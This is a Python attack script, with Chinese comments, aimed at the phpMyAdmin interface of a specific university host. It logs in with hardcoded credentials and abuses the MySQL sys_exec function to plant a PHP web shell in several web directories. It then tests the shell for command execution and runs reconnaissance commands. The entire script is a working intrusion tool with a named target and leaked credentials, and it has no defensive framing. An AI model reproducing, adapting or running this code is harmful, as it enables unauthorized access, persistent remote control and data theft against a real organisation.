#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[+] sys_exec可以执行命令!\n")

# 写入shell到web目录
print("[*] 写入shell到web目录...")
web_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/shell.php",
    "/var/www/html/enmeeting/s.php",
]

for web_path in web_paths:
    cmd = f"echo '<?php system(\$_GET[c]); ?>' > {web_path}"
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = web_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 执行命令获取信息
print("[*] 执行命令获取信息...")
info_cmds = [
    ("whoami", "当前用户"),
    ("id", "用户ID"),
    ("pwd", "当前目录"),
    ("ls -la /var/www/html/enmeeting/", "目录列表"),
]

for cmd, desc in info_cmds:
    print(f"\n[*] {desc}: {cmd}")
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    # sys_exec返回执行状态码，不直接返回输出
    # 但可以通过其他方式获取输出

print("\n[+] 命令执行完成!")
print("[*] 可以使用sys_exec执行任意系统命令")
